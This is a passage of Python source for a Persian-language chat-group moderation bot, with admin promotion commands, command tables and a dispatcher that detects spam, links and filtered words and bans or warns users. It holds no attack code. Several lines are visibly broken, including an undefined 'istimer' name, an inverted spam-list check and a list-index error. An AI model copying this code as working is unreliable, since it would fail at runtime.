        mess += MPro('#گوید_گروه / #گوید_گپ', 2)
        mess += MPro('#گوید_ریپلای', 2)
        mess += MPro('#گوید_ربات', 2)
        mess += MPro('#گوید_سازنده', 2)
        mess += MPro('#گوید_مالک', 2)
        mess += MPro('#گوید_تصادفی', 2)
        mess += MPro('#عدد_تصادفی / #عدد', 2)
        mess += MPro('#درصد_تصادفی / #درصد', 2)
        mess += MPro('#تاریخ', 2)
        mess += MPro('#ساعت', 2)
        mess += MPro('#سال', 2)
        mess += MPro('#هفته', 2)
        mess += MPro('#ماه', 2)
        mess += MPro('# user_guid', 2)
        return mess

    def unadmin_user_form_goldadmin(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if not message_info:
            return MPro('روی پیام پاک شده ریپلای زدی. ' + OBJM['INFOOBJECT']['types']['ok'])
        user_guid = GetReplyGuid(message_info)
        if user_guid == OWNER:
            return MPro('ایشون سازنده من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
        if user_guid == OBJM['INFOOBJECT']['owner']:
            return MPro('شما مالک من هستید. ' + OBJM['INFOOBJECT']['types']['ok'])
        if user_guid in OBJM['INFOOBJECT']['full_admins'] or user_guid in OBJM['INFOOBJECT']['admins']:
            if user_guid in OBJM['INFOOBJECT']['admins']:
                del INFOS[OBJM['object_guid']]['admins'][user_guid]
            if user_guid in OBJM['INFOOBJECT']['full_admins']:
                del INFOS[OBJM['object_guid']]['full_admins'][user_guid]
            first_name = check_name(OBJM['object_guid'], user_guid)
            return MPro(f'کاربر @@ {first_name} @@({user_guid}) برکنار شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def deleting_all_warnings(OBJM):
        for user_guid in USERS[OBJM['object_guid']]:
            USERS[OBJM['object_guid']][user_guid][1] = 0
        return MPro('تمام اخطار های کاربران حذف شد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def add_fulladmin_form_owner(OBJM):
        try:
            message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
            if not message_info:
                return MPro('روی پیام پاک شده ریپلای زدی. ' + OBJM['INFOOBJECT']['types']['ok'])
            user_guid = GetReplyGuid(message_info)
            if user_guid == OWNER:
                return MPro('ایشون سازنده من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == OBJM['INFOOBJECT']['owner']:
                return MPro('شما مالک من هستید. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == GUIDME:
                return MPro('ایشون من هستم. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid in OBJM['INFOOBJECT']['full_admins']:
                return MPro('ایشون ادمین ویژه است. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid:
                client.set_admin(OBJM['object_guid'], user_guid, [], random.choice(BoxEmoji))
                first_name = check_name(OBJM['object_guid'], user_guid)
                INFOS[OBJM['object_guid']]['full_admins'][user_guid] = first_name
                return MPro(f'کاربر @@ {first_name} @@({user_guid}) ادمین ویژه شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        except Exception as e:
            return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return mess

    def delete_shap_end_orders(OBJM):
        INFOS[OBJM['object_guid']]['types']['ok'] = ''
        return MPro('علامت حذف شد.', 2)

    def sum_tuples(tuple1, tuple2):
        list_1 = list(tuple1)
        list_2 = list(tuple2)
        for step in list_2:
            if step not in list_1:
                list_1.append(step)
        return tuple(list_1)

    def sum_dictionary(list1, list2):
        for command in list2:
            if command not in list1:
                list1[command] = list2[command]
        return list1

    def insert_keys_in_tuple(dics):
        new = []
        for dic in dics:
            for step in dic:
                new.append(step)
        return tuple(new)

    def add_goldadmin_from_owner(OBJM):
        try:
            message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
            if message_info:
                user_guid = GetReplyGuid(message_info)
                if user_guid == OWNER:
                    return MPro('شما سازنده من هستید. ' + OBJM['INFOOBJECT']['types']['ok'])
                if user_guid:
                    try:
                        client.set_admin(OBJM['object_guid'], user_guid, random.choice(BoxEmoji))
                    except Exception:
                        pass
                    first_name = check_name(OBJM['object_guid'], user_guid)
                    INFOS[OBJM['object_guid']]['owner'] = user_guid
                    return MPro('کاربر @@ ' + first_name + ' @@(' + user_guid + ') مالک شد. ' + OBJM['INFOOBJECT']['types']['ok'])
            else:
                return MPro('روی پیام پاک شده ریپلای زدی. ' + OBJM['INFOOBJECT']['types']['ok'])
        except Exception as e:
            raise e
            return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def add_fulladmin_form_goldadmin(OBJM):
        try:
            message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
            if message_info:
                user_guid = GetReplyGuid(message_info)
                if user_guid == OWNER:
                    return MPro('ایشون سازنده من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
                if OBJM['INFOOBJECT']['owner'] == user_guid:
                    return MPro('شما مالک من هستید. ' + OBJM['INFOOBJECT']['types']['ok'])
                if user_guid in OBJM['INFOOBJECT']['full_admins']:
                    return MPro('ایشون ادمین ویژه است. ' + OBJM['INFOOBJECT']['types']['ok'])
                if user_guid:
                    resetUser(user_guid, OBJM['object_guid'])
                    try:
                        client.set_admin(OBJM['object_guid'], user_guid, random.choice(BoxEmoji))
                    except Exception:
                        pass
                    first_name = check_name(OBJM['object_guid'], user_guid)
                    INFOS[OBJM['object_guid']]['full_admins'][user_guid] = first_name
                    return MPro('کاربر @@ ' + first_name + ' @@(' + user_guid + ') ادمین ویژه شد. ' + OBJM['INFOOBJECT']['types']['ok'])
            else:
                return MPro('روی پیام پاک شده ریپلای زدی. ' + OBJM['INFOOBJECT']['types']['ok'])
        except Exception as e:
            raise e
            return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def unadmin_user_form_owner(OBJM):
        try:
            message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
            if message_info:
                user_guid = GetReplyGuid(message_info)
                if user_guid == OWNER:
                    return MPro('شما سازنده من هستید. ' + OBJM['INFOOBJECT']['types']['ok'])
                if user_guid not in OBJM['INFOOBJECT']['full_admins'] and user_guid not in OBJM['INFOOBJECT']['admins']:
                    if OBJM['INFOOBJECT']['owner'] == user_guid:
                        return MPro('مقامی ندارد. ' + OBJM['INFOOBJECT']['types']['ok'])
                if user_guid:
                    try:
                        client.unset_admin(OBJM['object_guid'], user_guid)
                    except Exception:
                        pass
                    first_name = check_name(OBJM['object_guid'], user_guid)
                    if OBJM['INFOOBJECT']['owner'] == user_guid:
                        INFOS[OBJM['object_guid']]['owner'] = OWNER
                    if user_guid in OBJM['INFOOBJECT']['full_admins']:
                        del INFOS[OBJM['object_guid']]['full_admins'][user_guid]
                    if user_guid in OBJM['INFOOBJECT']['admins']:
                        del INFOS[OBJM['object_guid']]['admins'][user_guid]
                    return MPro('کاربر @@ ' + first_name + ' @@(' + user_guid + ') برکنار شد. ' + OBJM['INFOOBJECT']['types']['ok'])
            else:
                return MPro('روی پیام پاک شده ریپلای زدی. ' + OBJM['INFOOBJECT']['types']['ok'])
        except:
            return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def remove_exempt_user_reply(OBJM):
        try:
            message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
            if message_info:
                user_guid = GetReplyGuid(message_info)
                if user_guid:
                    first_name = check_name(OBJM['object_guid'], user_guid)
                    if user_guid in INFOS[OBJM['object_guid']]['exempt_list']:
                        del INFOS[OBJM['object_guid']]['exempt_list'][user_guid]
                        return MPro('کاربر @@ ' + first_name + ' @@(' + user_guid + ') از لیست معاف حذف شد. ' + OBJM['INFOOBJECT']['types']['ok'])
                    else:
                        return MPro('کاربر @@ ' + first_name + ' @@(' + user_guid + ') در لیست معاف یافت نشد. ' + OBJM['INFOOBJECT']['types']['ok'])
            else:
                return MPro('روی پیام پاک شده ریپلای زدی. ' + OBJM['INFOOBJECT']['types']['ok'])
        except:
            return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    list_command_owner_reply = {'ویژه': add_fulladmin_form_owner, 'مالک': add_goldadmin_from_owner, 'برکناری': unadmin_user_form_owner, 'پاکسازی کش': clear_cache}
    list_command_owner = {'لفت': left_form_group, 'RESETBOT': reset_bot_group, 'RESETINFO': reset_info_group, 'RESETUSERS': reset_users_group, 'RESETWORDS': reset_words, 'ریست ربات': send_reset_bot_group_message, 'بازنشانی ربات': send_reset_bot_group_message, 'ریست گپ': send_reset_bot_group_message, 'بازنشانی گپ': send_reset_bot_group_message, 'ریست گروه': send_reset_bot_group_message, 'بازنشانی گروه': send_reset_bot_group_message, 'ریست امار': send_reset_users_group_message, 'بازنشانی امار': send_reset_users_group_message, 'ریست کلمات': send_reset_words_message, 'لیست کلمات': send_list_words, 'فایل کلمات': send_file_words, 'بکاپ کلمات': send_file_words, 'فایل امار': send_file_users, 'بکاپ امار': send_file_users, 'فایل گپ': send_file_infos, 'بکاپ گپ': send_file_infos, 'فایل گروه': send_file_infos, 'بکاپ گروه': send_file_infos, 'اپدیت دیتا': updat_data_bot, 'دیتا سیو': updat_data_bot, 'بکاپ دیتا': updat_data_bot, 'لیست رسانه': list_media_form, 'لیست مدیا': list_media_form, 'سیو': save_media_pro, 'حذف شارژ گروه': delete_timeout_group, 'ریست تنظیمات': reset_setting}
    list_command_fulladmins_reply = {'بن': ban_user_reply, 'پین': pin_message_reply, 'ارتقا': add_admin_reply, 'برکناری': unadd_admin_reply, 'سکوت': add_silent_user_reply, 'معاف': add_exempt_user_reply, 'کیل': add_kill_user_reply, 'اخطار': give_warning_user_reply, 'امار': get_status_user_reply, 'رفع محدودیت': unban_user_reply, 'حذف اخطار': remove_warning_user_reply, 'حذف سکوت': remove_silent_user_reply, 'حذف معاف': remove_exempt_user_reply, 'حذف کیل': remove_kill_user_reply, 'تنظیم خوشامدگویی': set_welcome_message_reply, 'طول پیام': message_length, 'تنظیم خدافظی': set_bye_message_reply, 'تنظیم قوانین': set_rules_group_reply, 'تنظیم لقب': add_nickname_user_reply, 'تنظیم اصل': add_info_user_reply, 'Info': message_infos, 'ثبت لقب': add_nickname_user_reply, 'ثبت اصل': add_info_user_reply, 'حذف لقب': remove_nickname_user_reply, 'حذف اصل': remove_info_user_reply, 'تنظیم بنر': add_banner_reply}
    list_command_goldadmin_reply = {'ویژه': add_fulladmin_form_goldadmin, 'برکناری': unadmin_user_form_goldadmin}
    list_command_goldadmin = {'پاکسازی لیست ویژه': deleting_fulladmins_group, 'پاکسازی لیست سیاه': deleting_blacklist_group, 'پاکسازی لیست بن': deleting_blacklist_group, 'حذف تمام اخطارها': deleting_all_warnings, 'حذف تمام اخطار ها': deleting_all_warnings, 'شارژ گروه': send_timeout_group}
    list_command_fulladmins = {'کال': make_voice_call, 'ویسکال': make_voice_call, 'امارم': send_full_info_me, 'تنظیم': send_setting_commands, 'امار': send_status_commands, 'ریست': send_reset_commands, 'سرگرمی': send_games_commands, 'تنظیمات': send_panel_setting, 'پنل': send_panel_setting, 'گزارشات': send_reports_gap, 'نصب کتابخونه': install_pro_libs, 'داشبورد': send_dashboard, 'لیست': send_list_lists, 'امار گپ': send_status_gap, 'امار گروه': send_status_gap, 'امار اعضا': send_status_users, 'امار کل': send_status_all, 'نصب کتابخونه ها': install_pro_libs, 'مرتب سازی': arange_list_words, 'حذف بنر': remove_banner_gap, 'هوش مصنوعی': send_ai_commands, 'پاکسازی تایمر': reset_timer_commands, 'نصب لایب ها': install_pro_libs, 'نصب لایب': install_pro_libs, 'بهینه سازی': optimizing_source, 'ریست داشبورد': reset_dashboard, 'ریست قفل': reset_locks, 'ریست قفل ها': reset_locks, 'ریست دستورات': reset_commands, 'ریست قوانین': reset_rules, 'ریست خدافظی': reset_media_bye, 'ریست خوشامدگویی': reset_media_welcome, 'ریست بنر': reset_banner, 'ریست علامت': reset_symbol, 'ریست فونت': reset_font_text, 'ریست کلید': reset_main_keys, 'ریست شکل': reset_shape_text, 'لیست ویژه': send_list_fulladmins, 'لیست سکوت': send_list_silents, 'لیست معاف': send_list_exempts, 'لیست کیل': send_list_kills, 'لیست کلید': send_list_keys, 'ریست لیست کلید': reset_main_keys, 'لیست فیلتر': send_list_filters, 'لیست متادیتا': send_list_metadata, 'لیست ادمین': send_list_admins, 'لیست قفل': send_list_locks, 'لیست عضویت': send_list_joining, 'لیست یادداشت': send_list_notes, 'لیست تایمر': send_list_timer, 'اپدیت لیست ادمین': update_list_admins, 'حذف پیام مدیریتی': delete_managing_messages, 'حذف پیام ربات': delete_robot_messages, 'بررسی مجدد عضویت': recheck_joining, 'بررسی عضویت مجدد': recheck_joining, 'اپدیت گروه': update_group, 'باز کردن قفل ها': open_all_looks, 'بستن قفل ها': close_all_looks, 'باز کردن دستورات': open_all_commands, 'بستن دستورات': close_all_commands, 'باز کردن داشبورد': open_dashboard, 'بستن داشبورد': close_dashboard, 'لیست تگ': list_tag_form, 'لیست تگ ها': list_tag_form, 'حذف علامت': delete_shap_end_orders, 'وضعیت گروه': send_all_gap_status, 'وضعیت گپ': send_all_gap_status}
    list_filter_metadata = ['لیست متادیتا']
    list_command_users_reply = {'کشیده': send_text_keshideh, 'لش': send_text_lash, 'شکسته': send_text_shekasteh, 'لقب': send_your_laqab, 'لقبش': send_your_laqab, 'اصل': send_your_asl, 'اصلش': send_your_asl, 'مقام': send_your_maqam, 'مقامش': send_your_maqam, 'گوید': send_your_guid, 'گویدش': send_your_guid, 'اینفو': send_your_info, 'امار': send_your_info, 'امارش': send_your_info, 'اینفوش': send_your_info, 'تعداد پیام': send_your_count_messages, 'تعداد پیامش': send_your_count_messages, 'تعداد اخطار': send_your_count_warnings, 'تعداد اخطارش': send_your_count_warnings}
    list_command_users = {'اینفو': get_info_user_1, 'اینفوم': get_info_user_1, 'امارم': get_info_user_1, 'امار': get_info_user_1, 'تاس': send_tas, 'ورژن': send_version, 'نسخه': send_version, 'لینک': get_link_gap, 'تاریخ': get_full_date, 'تقویم': get_full_date, 'ساعت': get_clock, 'مالک': get_mention_malek, 'گوید گپ': get_guid_group, 'گوید گروه': get_guid_group, 'سکه': send_seckeh, 'جوک': send_api_jock, 'چالش': send_api_chalesh, 'بیو': send_api_bio, 'فکت': send_api_fact, 'اعتراف': send_api_etraf, 'دانستنی': send_api_danestani, 'داستان': send_api_dastan, 'تکست': send_api_textmod, 'گنگ': send_api_gang, 'انگیزشی': send_api_angizeshi, 'ذکر': send_api_zekr, 'فال': send_api_fal, 'لقب': send_nickname_me, 'اصل': send_asl_me, 'اصلم': send_asl_me, 'مقام': send_maqam_me, 'مقامم': send_maqam_me, 'گوید': send_guid_me, 'گویدم': send_guid_me, 'خوشامدگویی': send_media_welcom, 'خدافظی': send_media_bye, 'بنر': send_banner, 'قوانین': send_rules, 'محدودیت': send_limites, 'سازنده': send_maqam_maker, 'پروفایل': send_api_profile, 'بکگراند': send_api_background, 'والپیپر': send_api_background, 'پروکسی': send_api_procsy, 'فتوگرافی': send_api_photography, 'ارز': send_api_arz, 'دقت': send_api_deghat, 'حق': send_api_hagh, 'فال حافظ': send_api_fal_hafez, 'عدد شانسی': send_random_number, 'تعداد پیام': send_count_messages_me, 'تعداد اخطار': send_count_warnning_me, 'تعداد پیامم': send_count_messages_me, 'تعداد اخطارم': send_count_warnning_me, 'پ ن پ': send_api_pnp}
    list_command_users_all = insert_keys_in_tuple([list_command_users, list_command_users_reply])
    list_command_users_reply_keys = insert_keys_in_tuple([list_command_users_reply])
    list_command_users_keys = insert_keys_in_tuple([list_command_users])
    list_command_fulladmins_reply_keys = insert_keys_in_tuple([list_command_fulladmins_reply])
    list_command_fulladmins_keys = insert_keys_in_tuple([list_command_fulladmins])
    list_command_goldadmin_reply_keys = insert_keys_in_tuple([list_command_goldadmin_reply])
    list_command_goldadmin_keys = insert_keys_in_tuple([list_command_goldadmin])
    list_command_owner_reply_keys = insert_keys_in_tuple([list_command_owner_reply])
    list_command_owner_keys = insert_keys_in_tuple([list_command_owner])
    list_command_goldadmin = sum_dictionary(list_command_goldadmin, list_command_fulladmins)
    list_command_goldadmin_reply = sum_dictionary(list_command_goldadmin_reply, list_command_fulladmins_reply)
    list_command_goldadmin_keys = sum_tuples(list_command_goldadmin_keys, list_command_fulladmins_keys)
    list_command_goldadmin_reply_keys = sum_tuples(list_command_goldadmin_reply_keys, list_command_fulladmins_reply_keys)
    list_command_owner = sum_dictionary(list_command_owner, list_command_goldadmin)
    list_command_owner_reply = sum_dictionary(list_command_owner_reply, list_command_goldadmin_reply)
    list_command_owner_keys = sum_tuples(list_command_owner_keys, list_command_goldadmin_keys)
    list_command_owner_reply_keys = sum_tuples(list_command_owner_reply_keys, list_command_goldadmin_reply_keys)
    list_command_owner = sum_dictionary(list_command_owner, list_command_users)
    list_command_owner_reply = sum_dictionary(list_command_owner_reply, list_command_users_reply)
    list_command_owner_keys = sum_tuples(list_command_owner_keys, list_command_users_keys)
    list_command_owner_reply_keys = sum_tuples(list_command_owner_reply_keys, list_command_users_reply_keys)

    def commands_colection(client, object_guid, guid_sender, update_message, is_timer=False):
        global typespeak, SPEAKX
        message_info = update_message.get('message', {})
        message_type = message_info.get('type', '')
        command = message_info.get('text', '')
        if istimer:
            is_reply_message, message_id, event_data, metadata = (None, None, None, None)
            is_forward = False
        else:
            is_reply_message = message_info.get('reply_to_message_id', None)
            message_id = update_message.get('message_id', None)
            event_data = message_info.get('event_data', None)
            metadata = message_info.get('metadata', None)
            is_forward = message_info.get('forwarded_from', False)
        if 'file_inline' in message_info:
            message_type = message_info.get('file_inline', {}).get('type', '')
        if event_data:
            event_type = event_data.get('type', '')
            if not guid_sender:
                performer_object = event_data.get('performer_object', None)
                if performer_object:
                    guid_sender = performer_object.get('object_guid', '')
        if command:
            lower_command = command.lower()
            if command.endswith('-'):
                command = command[:-1].strip()
                silentMod = True
            else:
                silentMod = False
            if command.endswith('+'):
                command = command[:-1] + '-'
            command = command.replace('آ', 'ا')
            if '&' in command:
                tags = {'1': '``', '2': '**', '_': '__', '3': '~~', '4': '--', '5': '##', '6': '@@'}
                for tag in tags:
                    command = command.replace('&' + tag, tags[tag])
            wordCount = command.count(' ')
            command = supper_command(command)
        else:
            lower_command, silentMod = (False, False)
        ResultME, ismanagerms = (False, True)
        INFOOBJECT = INFOS[object_guid]
        if 'object_guid' not in INFOOBJECT:
            INFOOBJECT['object_guid'] = object_guid
        HOWNER = INFOOBJECT['owner']
        FULL_ADMINS = INFOOBJECT['full_admins']
        ADMINS = INFOOBJECT['admins']
        ST = INFOOBJECT['types']
        SETTING_KEYS = list(INFOOBJECT['setting'])
        LOCKS_KEYS = list(INFOOBJECT['locks'])
        FILTERLIST = INFOOBJECT['filterlist']
        ORDERS_KEYS = list(INFOOBJECT['keys'])
        if guid_sender == Coder:
            TIP = 4
        elif guid_sender == OWNER:
            TIP = 4
        elif guid_sender == HOWNER:
            TIP = 3
        elif guid_sender in FULL_ADMINS:
            TIP = 2
        elif guid_sender in ADMINS:
            TIP = 1
        else:
            TIP = 0
        dopin = False
        if TIP >= 2 and command:
            if '-پین' in command:
                dopin = True
                command = command.replace('-پین', '').strip()
            elif '+پین' in command:
                command = command.replace('+پین', '-پین').strip()
        OBJM = {'INFOOBJECT': INFOOBJECT, 'guid_sender': guid_sender, 'object_guid': object_guid, 'message_id': message_id, 'LOCKS_KEYS': LOCKS_KEYS, 'SETTING_KEYS': SETTING_KEYS, 'ORDERS_KEYS': ORDERS_KEYS, 'is_reply_message': is_reply_message, 'ismanagerms': ismanagerms, 'istimer': istimer, 'silentMod': silentMod, 'TIP': TIP}
        if TIP >= 3 and command:
            if command == 'غیر فعال' or command == 'غیرفعال':
                if INFOOBJECT['state']:
                    send_message(OBJM, 'ربات غیرفعال شد.', message_id)
                    INFOOBJECT['state'] = False
                    UPFILES(file_infos, INFOS)
                    return True
                else:
                    send_message(OBJM, 'ربات از قبل غیرفعال بود.', message_id)
                    return True
            elif command == 'فعال':
                if object_guid not in USERS:
                    USERS[object_guid] = {}
                if not INFOOBJECT['state']:
                    send_message(OBJM, 'ربات فعال شد.', message_id)
                    INFOOBJECT['state'] = True
                    UPFILES(file_infos, INFOS)
                    return True
                else:
                    send_message(OBJM, 'ربات از قبل فعال بود.', message_id)
                    return True
            elif INFOOBJECT['state']:
                if lower_command and lower_command.startswith('multi commands'):
                    commands = command.replace('multi commands', '').strip()
                    commands = commands.replace('Multi commands', '').strip()
                    commands = commands.replace('آ', 'ا')
                    commands = commands.split('\n')
                    multi_commands = []
                    for cmd in commands:
                        multi_commands.append(f'{cmd} -')
                    for cmd in multi_commands:
                        command = cmd
                        update_message['message']['text'] = command
                        commands_colection(client, object_guid, guid_sender, update_message, True)
                    mess = MPro('دستورات اجرا شد. ', ST['ok'])
                    send_message(OBJM, mess, message_id)
                    return True
        if INFOOBJECT['state']:
            isok = True
        if guid_sender in INFOOBJECT['black_list'] and TIP <= 1:
            client.ban_member(object_guid, guid_sender)
            INFOOBJECT['black_list'][guid_sender] = 1
            first_name = INFOOBJECT['black_list'][guid_sender][0]
            mess = MPro(f'کاربر @@ {first_name} @@({guid_sender}) کیل شد. ', ST['ok'])
            send_message(OBJM, mess, message_id)
            ResultME = True
            isok = False
        if TIP <= 1:
            reports = {}
            if is_forward:
                reports[9] = 'فوروارد'
            if command:
                if '.ir' in lower_command or 'http' in lower_command:
                    reports[8] = 'لینک'
                if '@' in command:
                    reports[7] = 'ایدی'
                xc = ''
                for x in command:
                    if x in TPE:
                        xc += x
                for x in FILTERLIST:
                    if x in xc:
                        reports[15] = f'متن نامناسب 〔 {x} 〕'
                for x in TEGX:
                    if x in lower_command:
                        reports[18] = 'انگلیسی'
                if len(command.split('\n')) >= 25 or len(command) > 420:
                    reports[20] = 'کد هنگی'
            if metadata:
                reports[19] = 'متادیتا'
            if message_type in ListLockNames:
                pr = ListLockNames[message_type]
                reports[Listlocks[pr]] = pr
            if event_data and event_type == 'JoinedGroupByLink':
                if guid_sender in JoindUsers[object_guid]:
                    reports[17] = 'جوین تکراری'
                else:
                    JoindUsers[object_guid].append(guid_sender)
            if int(INFOOBJECT['locks'][16]) == 0 and (not event_data):
                isspam = False
                if object_guid in Spam:
                    Spam[object_guid] = []
                if len(Spam[object_guid]) >= 10:
                    Spam[object_guid].pop(0)
                if command:
                    message_spam = command
                else:
                    message_spam = message_type
                Spam[object_guid].append([guid_sender, message_spam, get_iran_timestamp()])
                if command:
                    if len(command.split('\n')) >= 7 or len(command) > 420:
                        reports[16], isspam = ('اسپم 〔 ارسال پیام بلند 〕', True)
                lastnum = int(len(Spam[object_guid]))
                if lastnum >= 10 and (not isspam):
                    lastone = Spam[object_guid][lastnum - 1]
                    firstone = Spam[object_guid][0]
                    limit_mes = lastnum * 2
                    during_time = lastone[2] - firstone[2]
                    if during_time <= limit_mes:
                        sensetif = 1
                        check_mses = []
                        for step in Spam[object_guid]:
                            check_mses.append(step[1])
                        ls_check_ms = lastone[1]
                        for check_ms in check_mses:
                            if check_ms == ls_check_ms:
                                sensetif += 1
                            if sensetif >= lastnum - 5:
                                reports[16], isspam = ('اسپم 〔 ارسال پیام تکراری 〕', True)
                                break
                        if not isspam:
                            sens = 1
                            for step in Spam[object_guid]:
                                if step[0] == lastone[0]:
                                    sens += 1
                                if sens >= lastnum:
                                    reports[16], isspam = ('اسپم 〔 ارسال پیام رگباری 〕', True)
                                    break
                    else:
                        sensetif = 1
                        check_mses = []
                        for step in Spam[object_guid]:
                            check_mses.append(step[1])
                        ls_check_ms = lastone[1]
                        for check_ms in check_mses:
                            if check_ms == ls_check_ms:
                                sensetif += 1
                            if sensetif >= lastnum - 5:
                                reports[16], isspam = ('اسپم 〔 ارسال پیام تکراری 〕', True)
                                break

            if guid_sender not in INFOOBJECT['exempt_list']:
                for step in reports:
                    if isinstance(step, str):
                        step = Listlocks[step]
                    if int(LOCKS_KEYS[step]) == 0:
                        warning_type = reports[step]
                        locks_warning = list(INFOOBJECT['locks_warning'])
                        locks_ban = list(INFOOBJECT['locks_ban'])
                        locks_warning_show = list(INFOOBJECT['locks_warning_show'])
                        if int(SETTING_KEYS[5]) and int(locks_ban[step]):
                            if guid_sender not in USERS[object_guid]:
                                USERS[object_guid][guid_sender] = [0, 0, 'اراذل', 'ناشناس']
                            count = int(locks_warning[step])
                            pscount = USERS[object_guid][guid_sender][1] + 1
                            if pscount >= count:
                                if TIP >= 1:
                                    try:
                                        client.unset_admin(object_guid, guid_sender)
                                    except:
                                        pass
                                    if guid_sender in INFOOBJECT['admins']:
                                        del INFOS[object_guid]['admins'][guid_sender]
                                else:
                                    try:
                                        reply_message_banded_id = client.ban_member(object_guid, guid_sender)
                                        if 'chat_update' in reply_message_banded_id:
                                            reply_message_banded_id = reply_message_banded_id['chat_update']
                                        if 'chat' in reply_message_banded_id:
                                            reply_message_banded_id = reply_message_banded_id['chat']
                                        reply_message_banded_id = reply_message_banded_id['last_message']['message_id']
                                    except:
                                        pass
                                    if int(SETTING_KEYS[8]):
                                        step = PorotectMSS(SETTING_KEYS, TimeMessages, 5)
                                        if step:
                                            send_message(OBJM, INFOOBJECT['bye'])
                                    resetUser(guid_sender, object_guid)
                                    USERS[object_guid][guid_sender][1] = 1
                                    INFOS[object_guid]['ban'] += 1
                                if pscount == count:
                                    if int(SETTING_KEYS[6]) and int(locks_warning_show[step]):
                                        step = PorotectMSS(SETTING_KEYS, TimeMessages, 5)
                                        if step:
                                            if TIP >= 1:
                                                ResultME = send_message_limited(OBJM, f'**{warning_type}** @@ممنوع است. @@({guid_sender})〔{pscount}/{count}〕⚠️', message_id)
                                            else:
                                                ResultME = send_message_limited(OBJM, f'**{warning_type}** @@ممنوع است. @@({guid_sender})〔{pscount}/{count}〕🚫', message_id)
                            else:
                                if int(SETTING_KEYS[6]) and int(locks_warning_show[step]):
                                    step = PorotectMSS(SETTING_KEYS, TimeMessages, 5)
                                    if step:
                                        ResultME = send_message_limited(OBJM, f'**{warning_type}** @@ممنوع است. @@({guid_sender})〔{pscount}/{count}〕⚠️', message_id)
                            USERS[object_guid][guid_sender][1] += 1
                        client.delete_messages(object_guid, [message_id])
                        isok = False
            for step in reports:
                if isinstance(step, str):
                    for _ in ListLocks_R:
                        if ListLocks_R[_] == step:
                            step = _
                            break
                if ListLocks_R[step] in INFOOBJECT['type_messages']:
                    INFOS[object_guid]['type_messages'][ListLocks_R[step]] += 1
                else:
                    INFOS[object_guid]['type_messages'][ListLocks_R[step]] = 1

        if not isok:
            return True
        if guid_sender in INFOOBJECT['silent_list'] and TIP <= 1:
            client.delete_messages(object_guid, [message_id])
            return True
        if event_data and (not ResultME):
            if event_type == 'LeaveGroup':
                INFOOBJECT['left'] += 1
                result = ExtraInfo(OBJM, INFOOBJECT, SETTING_KEYS, TimeMessages, 'bye')
                if result:
                    send_message(OBJM, result, message_id)
                    ResultME = True
            elif event_type == 'JoinedGroupByLink':
                INFOOBJECT['join'] += 1
                result = ExtraInfo(OBJM, INFOOBJECT, SETTING_KEYS, TimeMessages, 'welcome')
                if result:
                    send_message(OBJM, result, message_id)
                    ResultME = True
            elif event_type == 'AddedGroupMembers':
                INFOOBJECT['add'] += 1
                result = ExtraInfo(OBJM, INFOOBJECT, SETTING_KEYS, TimeMessages, 'welcome')
                if result:
                    send_message(OBJM, result, message_id)
                    ResultME = True
            elif event_type == 'RemoveGroupMembers':
                INFOOBJECT['ban'] += 1
                result = ExtraInfo(OBJM, INFOOBJECT, SETTING_KEYS, TimeMessages, 'bye')
                if result:
                    send_message(OBJM, result, message_id)
                    ResultME = True
                resetUser(guid_sender, object_guid)
            elif event_type == 'CreateGroupVoiceChat':
                INFOOBJECT['voice_call'] += 1
                result = CheckSetting(SETTING_KEYS, 'اعلان')
                if result:
                    mess = MPro(f'@@[ ویس کال ایجاد شد. ]@@({guid_sender})', 2)
                    send_message(OBJM, mess, message_id)
                    ResultME = True
            elif event_type == 'StopGroupVoiceChat':
                result = CheckSetting(SETTING_KEYS, 'اعلان')
                if result:
                    mess = MPro(f'@@[ ویس کال قطع شد. ]@@({guid_sender})', 2)
                    send_message(OBJM, mess, message_id)
                    ResultME = True
            elif event_type == 'TitleUpdate':
                INFOOBJECT['name'] = event_data['title']
                result = CheckSetting(SETTING_KEYS, 'اعلان')
                if result:
                    mess = MPro(f'@@[ اسم گروه اپدیت شد. ]@@({guid_sender})', 2)
                    send_message(OBJM, mess, message_id)
                    ResultME = True
            elif event_type == 'PhotoUpdate':
                result = CheckSetting(SETTING_KEYS, 'اعلان')
                if result:
                    mess = MPro(f'@@[ عکس گروه اپدیت شد. ]@@({guid_sender})', 2)
                    send_message(OBJM, mess, message_id)
                    ResultME = True
            guid_sender = False
            command = False
            if int(SETTING_KEYS[12]) == 0:
                client.delete_messages(object_guid, [message_id])
        if command:
            if not ResultME and wordCount <= 5:
                if TIP == 4 and (not ResultME):
                    if is_reply_message and command in list_command_owner_reply_keys:
                        text = list_command_owner_reply[command](OBJM)
                        if text:
                            send_message(OBJM, text, message_id)
                            ResultME = True
                    elif command in list_command_owner_keys:
                        if command in list_filter_metadata:
                            metadata = False
                        else:
                            metadata = True
                        text = list_command_owner[command](OBJM)
                        if text:
                            send_message(OBJM, text, message_id, metadata=metadata)
                            ResultME = True
                        elif text is False:
                            return None
                        ResultME = True
                    elif is_reply_message:
                        if wordCount == 1:
                            if command.startswith('تبدیل '):
                                type_result = command.replace('تبدیل', '').strip()
